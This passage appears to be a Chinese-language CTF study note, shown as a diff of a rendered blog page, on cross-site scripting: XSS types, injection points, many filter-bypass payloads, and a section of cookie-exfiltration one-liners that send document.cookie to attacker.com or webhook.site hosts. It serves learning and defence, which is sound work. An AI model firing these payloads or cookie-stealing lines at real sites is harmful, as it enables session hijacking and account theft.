+<p>数据流通：将恶意代码通过交互界面上传到后端，然后从而上传到数据库中（实现自动化攻击），当管理员admin查询数据库的信息时，恶意脚本又从后端到了前端</p>
+<p><strong>在CTF中，利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本</strong></p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>非持久化，需欺骗用户去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般出现在搜索页面，大多数用来盗取Cookie</p>
+<p>数据流通：我们在一个输入框（一般是<code>&lt;input&gt;</code>标签形成）里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示</p>
+<p><strong>在CTF中，题目会给一个输入框，然后绕过过滤，执行恶意脚本</strong></p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>只发生在前端，利用 JavaScript 在浏览器端操作 DOM 时，动态插入和执行恶意代码，是通过url传入参数去控制触发的（也属于反射型XSS）</p>
+<p>数据流通：在前端url添加我们的恶意脚本，然后直接在页面输出</p>
+<h3 id="JSONP型XSS"><a href="#JSONP型XSS" class="headerlink" title="JSONP型XSS"></a>JSONP型XSS</h3><p>在浏览器的同源策略下，前端 JavaScript 不能直接跨域请求 <code>AJAX</code>（一种无需刷新页面就能向服务器发送和接收数据的技术），但可以利用 <code>&lt;script&gt;</code> 标签（允许跨域加载特性）进行跨域请求（允许从一个域名中获取到另一个域名的数据）</p>
+<p>后端返回的是带回调函数的 JSON 数据，前端利用回调函数（<code>callback</code>）解析数据</p>
+<p>攻击者可以<strong>伪造回调函数</strong>，利用 JSONP 执行任意 JavaScript 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器不做安全限制，返回的数据是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这时 <code>alert()</code> 直接执行，可能导致 XSS 攻击，也可以窃取受害者的 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=evilFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function evilFunction(data) &#123;</span><br><span class="line">    document.write(&quot;&lt;img src=&#x27;http://attacker.com/steal?cookie=&quot; + document.cookie + &quot;&#x27;&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS的攻击对象（XSS最终插入到哪里）"><a href="#XSS的攻击对象（XSS最终插入到哪里）" class="headerlink" title="XSS的攻击对象（XSS最终插入到哪里）"></a>XSS的攻击对象（XSS最终插入到哪里）</h2><h3 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h3><p>利用闭合的方式从而插入HTML注释内容之中</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>可能利用某些解析漏洞，导致代码执行</p>
+<p>绕过 WAF（安全防火墙）检测，隐藏 XSS 代码（如果后端在某些情况下错误地解析了注释（比如动态拼接 HTML），注释中的 XSS 可能会被执行）</p>
+<p>诱导用户手动执行 XSS（社工攻击）</p>
+<p>前端错误解析 HTML 注释，导致 XSS 触发（如<code>innerHTML</code>没有正确处理注释，导致 <code>&lt;script&gt;</code> 被执行）</p>
+<p>配合 DOM XSS，影响前端页面（如 <code>innerHTML</code> 解析了注释，导致 <code>&lt;img&gt;</code> 执行 <code>onerror</code> XSS）</p>
+</blockquote>
+<h3 id="插入到HTML标签的属性值中"><a href="#插入到HTML标签的属性值中" class="headerlink" title="插入到HTML标签的属性值中"></a>插入到HTML标签的属性值中</h3><p>通常配合<code>onerror</code>使用</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<h4 id="onerror（XSS利用点）"><a href="#onerror（XSS利用点）" class="headerlink" title="onerror（XSS利用点）"></a>onerror（XSS利用点）</h4><p>一个<strong>事件处理程序</strong>，当资源（如图片、脚本、iframe）加载失败时触发</p>
+<h5 id="利用-标签"><a href="#利用-标签" class="headerlink" title="利用 &lt;img&gt; 标签"></a>利用 <code>&lt;img&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS!&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用-标签-1"><a href="#利用-标签-1" class="headerlink" title="利用 &lt;script&gt; 标签"></a>利用 <code>&lt;script&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;bad&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用-iframe"><a href="#利用-iframe" class="headerlink" title="利用 iframe"></a>利用 <code>iframe</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;invalid.html&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="onerror-结合-javascript-伪协议"><a href="#onerror-结合-javascript-伪协议" class="headerlink" title="onerror 结合 javascript: 伪协议"></a><code>onerror</code> 结合 <code>javascript:</code> 伪协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<h3 id="插入到HTML标签的属性名中"><a href="#插入到HTML标签的属性名中" class="headerlink" title="插入到HTML标签的属性名中"></a>插入到HTML标签的属性名中</h3><p>如果服务器端没有正确转义 <code>name</code>，而是直接在 HTML 中插入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&#123;&#123; user_input &#125;&#125;&quot;&gt;!&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器解析后，HTML 变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let userInput = prompt(&quot;请输入标签名：&quot;);  </span><br><span class="line">    document.getElementById(&quot;content&quot;).innerHTML = `&lt;img $&#123;userInput&#125;&gt;`;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src=x onerror=&quot;&lt;/img&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>解析后的HTML：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>原因：<code>&lt;img&gt;</code>是自闭合标签，不会有 <code>&lt;/img&gt;</code> 这样的闭合标签，当解析器看到 <code>&quot;&lt;/img&gt;</code>，它会忽略这个 <code>&lt;/img&gt;</code> 并直接闭合 <code>&lt;img&gt;</code></p>
+<h3 id="最简单的插入到script-img-svg标签中"><a href="#最简单的插入到script-img-svg标签中" class="headerlink" title="最简单的插入到script,img,svg标签中"></a>最简单的插入到script,img,svg标签中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="插入到CSS中-旧版浏览器"><a href="#插入到CSS中-旧版浏览器" class="headerlink" title="插入到CSS中(旧版浏览器)"></a>插入到CSS中(旧版浏览器)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`xss`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码</p>
+<h3 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h3><p>这就要牵扯到CRLF漏洞</p>
+<p>利用CRLF漏洞将http包分为了header和body，利用回车符&#x2F;换行符成功执行了body中的代码，实现XSS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>返回包变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到XSS过滤的情况我们还可以在httpheader中注入<code>X-XSS-Protection:0</code>（旧版服务器），可绕过浏览器的过滤规则实现XSS弹窗显示（主要为反射型XSS）</p>
+<h2 id="XSS的绕过"><a href="#XSS的绕过" class="headerlink" title="XSS的绕过"></a>XSS的绕过</h2><h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p><code>eval</code>，<code>top</code>，<code>window</code>，<code>self</code>，<code>parent</code>，<code>frames</code>等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="函数替换绕过"><a href="#函数替换绕过" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="document-write"><a href="#document-write" class="headerlink" title="document.write()"></a>document.write()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="setTimeout-和-setInterval"><a href="#setTimeout-和-setInterval" class="headerlink" title="setTimeout()和 setInterval()"></a><code>setTimeout()</code>和 <code>setInterval()</code></h5><p>JavaScript 中用于延时执行代码的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用构造器"><a href="#利用构造器" class="headerlink" title="利用构造器"></a>利用构造器</h5><p>通过构造器动态生成并执行 JavaScript 代码</p>
+<p><code>Set.constructor</code>，<code>Map.constructor</code>，<code>Array.constructor</code>，<code>WeakSet.constructor</code>，<code>constructor.constructor</code>等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用数组方法"><a href="#利用数组方法" class="headerlink" title="利用数组方法"></a>利用数组方法</h5><p><code>[1].map</code>，<code>[1].find</code>，<code>[1].every</code>，<code>[1].filter</code>，<code>[1].forEach</code>，<code>[1].findIndex</code>等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;XSS&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>sc&lt;script&gt;ript</code>，<code>&lt;script&gt;</code> 被分成两部分：<code>sc</code> 和 <code>ript</code>，这样 XSS 过滤器可能不会识别整个标签，从而不会阻止该代码的执行</p>
+<h4 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!IMPORTANT]</p>
+<h4 id="map-方法"><a href="#map-方法" class="headerlink" title="map()方法"></a>map()方法</h4><p>用于对数组中的每个元素执行提供的回调函数，并返回一个新的数组，新的数组包含回调函数的返回值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array.map(callback(currentValue, index, array))</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数</strong>：</p>
+<ul>
+<li><code>callback</code>：对每个数组元素执行的函数</li>
+<li><code>currentValue</code>：当前处理的元素</li>
+<li><code>index</code>（可选）：当前处理的元素的索引</li>
+<li><code>array</code>（可选）：调用 <code>map()</code> 方法的数组</li>
+</ul>
+</blockquote>
+<p>最后一个payload解释：</p>
+<p><code>[&#39;ale&#39;+&#39;rt&#39;]</code> 是一个包含字符串 <code>&#39;alert&#39;</code> 的数组</p>
+<p><code>map(top[&#39;ev&#39;+&#39;al&#39;])</code> 使用 <code>map()</code> 方法对该数组进行操作，最终将 <code>alert</code> 函数赋值给数组的第一个元素</p>
+<p><code>[0]</code> 取出数组的第一个元素，即 <code>alert</code> 函数</p>
+<p><code>valueOf()</code> 获取该函数的原始值（即 <code>alert</code> 函数本身）</p>
+<p>最后，调用 <code>alert(1)</code> 执行 JavaScript 代码</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p><code>&lt;</code>被编码为<code>%3C</code>，<code>&gt;</code>被编码为<code>%3E</code>，<code>&amp;</code>被编码为<code>%26</code>，<code>/</code>被编码为<code>%2F</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%3Cscript%3Ealert(1)%3C%2Fscript%3E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h4><p>是将某些特殊字符转换成以 <code>&amp;</code> 开头、<code>;</code> 结尾的实体格式</p>
+<p><code>&lt;</code>被编码为<code>&amp;lt;</code>，<code>&gt;</code>被编码为<code>&amp;gt;</code>，<code>&amp;</code>被编码为<code>&amp;amp;</code>，<code>/</code>被编码为<code>&amp;#47;</code>，<code>“</code>被编码为<code>&amp;quot;</code>，<code>’</code>被编码为<code>&amp;apos;</code>，<code> </code>被编码为<code>&amp;nbsp;</code>，<code>=</code>被编码为<code>&amp;#61;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>alert(1)</code>编码为<code>atob(&#39;YWxlcnQoMSk=&#39;)</code></p>
+<h4 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a>双重编码</h4><p>例如，先对 <code>&lt;</code> 编码为 <code>%3C</code>，再将<code>%3C</code>编码为 <code>%253C</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%253Cscript%253Ealert(1)%253C%252Fscript%253E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h4><p>Unicode 编码使用十六进制值表示字符，它可以用于替代常见的 ASCII 字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>97,108,101,114,116,40,49,41</code>是 <code>alert(1)</code> 每个字符的 Unicode 编码值</p>
+<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20</p>
+<p>B位置：%09，%0A，%0C，%0D，%20</p>
+<p>C位置：%0B，&#x2F;**&#x2F; （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p>
+<p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="()绕过"></a>()绕过</h3><h4 id="使用反引号"><a href="#使用反引号" class="headerlink" title="使用反引号"></a>使用反引号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onload</code>：当 SVG 元素及其资源加载完成后触发。事件触发时会执行后面的 JavaScript 代码</p>
+<p><code>window.onerror = eval;</code>：<code>window.onerror</code> 是一个全局的错误处理函数，当 JavaScript 执行时发生错误，它会被调用。通过将其设置为 <code>eval</code>，攻击者可以劫持错误处理并执行恶意的 JavaScript 代码</p>
+<p><code>throw &#39;=alert\x281\x29&#39;;</code>：这行代码通过 <code>throw</code> 抛出一个异常<code>alert(1)</code></p>
+<h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><h4 id="使用反引号-1"><a href="#使用反引号-1" class="headerlink" title="使用反引号"></a>使用反引号</h4><h4 id="用斜杠替换"><a href="#用斜杠替换" class="headerlink" title="用斜杠替换"></a>用斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="alert过滤绕过"><a href="#alert过滤绕过" class="headerlink" title="alert过滤绕过"></a>alert过滤绕过</h3><h4 id="函数替换绕过-1"><a href="#函数替换绕过-1" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><p><code>prompt()</code>，<code>confirm()</code>，<code>console.log()</code>，<code>document.write()</code></p>
+<h4 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h4><h4 id="对象方法绕过"><a href="#对象方法绕过" class="headerlink" title="对象方法绕过"></a>对象方法绕过</h4><p>利用对象的属性或方法来替代直接调用 <code>alert</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window.constructor.constructor(&#x27;alert(1)&#x27;)()&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="数组方法绕过"><a href="#数组方法绕过" class="headerlink" title="数组方法绕过"></a>数组方法绕过</h4><h4 id="异步调用绕过"><a href="#异步调用绕过" class="headerlink" title="异步调用绕过"></a>异步调用绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(&#x27;alert(1)&#x27;, 0)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="字符替换绕过"><a href="#字符替换绕过" class="headerlink" title="字符替换绕过"></a>字符替换绕过</h4><h4 id="分割关键字绕过"><a href="#分割关键字绕过" class="headerlink" title="分割关键字绕过"></a>分割关键字绕过</h4><p>通过在关键字中插入空格或注释符号（ <code>/**/</code>）来分隔函数名</p>
+<p><code>a/**/l/**/ert(1)</code></p>
+<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><h4 id="用拆分法"><a href="#用拆分法" class="headerlink" title="用拆分法"></a>用拆分法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;hack&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="用嵌套结构"><a href="#用嵌套结构" class="headerlink" title="用嵌套结构"></a>用嵌套结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(&#x27;&lt;img src=1 onerror=alert(1)&gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h3><p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当浏览器遇到 <code>throw 1</code> 时，它会抛出一个错误</p>
+<p>抛出错误时，<code>onerror</code> 事件会被触发，因为我们之前将 <code>onerror</code> 设置为了 <code>alert</code> 函数</p>
+<p>结果是，浏览器会弹出一个对话框，显示 <code>1</code>，这就是 <code>alert(1)</code> 的效果</p>
+<h3 id="绕过CSP（未完）"><a href="#绕过CSP（未完）" class="headerlink" title="绕过CSP（未完）"></a>绕过CSP（未完）</h3><h3 id="绕过WAF（未完）"><a href="#绕过WAF（未完）" class="headerlink" title="绕过WAF（未完）"></a>绕过WAF（未完）</h3><h2 id="cookie外带"><a href="#cookie外带" class="headerlink" title="cookie外带"></a>cookie外带</h2><p>XSS靶场中通常以<strong>前端检测网页是否弹窗</strong>来判断有没有被XSS，但比赛&#x2F;实战中，通常以XSS真实场景，需要外带出Cookie</p>
+<h3 id="获取cookie（待定）"><a href="#获取cookie（待定）" class="headerlink" title="获取cookie（待定）"></a>获取cookie（待定）</h3><h3 id="带出cookie（通常对-进行编码-2B）"><a href="#带出cookie（通常对-进行编码-2B）" class="headerlink" title="带出cookie（通常对+进行编码%2B）"></a>带出cookie（通常对+进行编码%2B）</h3><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a><code>fetch()</code>方法</h4><p><code>fetch()</code> 允许 JavaScript 发送 HTTP 请求。如果 <code>credentials: &#39;include&#39;</code>，则可以携带当前站点的 Cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
+
+<h4 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a><code>XMLHttpRequest</code> 对象</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="window-location-对象"><a href="#window-location-对象" class="headerlink" title="window.location 对象"></a><code>window.location</code> 对象</h4><p><code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong></p>
+<h5 id="window-location-href"><a href="#window-location-href" class="headerlink" title="window.location.href"></a><code>window.location.href</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
+
+<h5 id="window-location-assign-url"><a href="#window-location-assign-url" class="headerlink" title="window.location.assign(url)"></a><code>window.location.assign(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
+
+<h5 id="window-location-replace-url"><a href="#window-location-replace-url" class="headerlink" title="window.location.replace(url)"></a><code>window.location.replace(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
+
+<h4 id="window-open方法"><a href="#window-open方法" class="headerlink" title="window.open方法"></a><code>window.open</code>方法</h4><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象</p>
+<p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
+
